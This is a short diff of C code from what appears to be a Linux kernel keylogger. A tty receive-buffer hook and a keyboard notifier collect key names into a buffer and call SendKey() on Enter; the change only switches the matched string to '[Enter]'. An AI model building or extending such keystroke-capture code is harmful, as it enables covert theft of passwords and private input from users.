@@ -173,7 +173,7 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
             }
             
             // Wait until a command has been entered before notifying listeners
-            if ( strcmp( "Enter", key_name ) == 0  ) {
+            if ( strcmp( "[Enter]", key_name ) == 0  ) {
                 SendKey();
             }
         }
@@ -194,7 +194,7 @@ int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param
             cur_buf_length += sprintf( key_buffer + cur_buf_length, "%s", key_name );
         }
 
-        if ( strcmp( "Enter", key_name ) == 0 ) {
+        if ( strcmp( "[Enter]", key_name ) == 0 ) {
             SendKey();
         }
     }
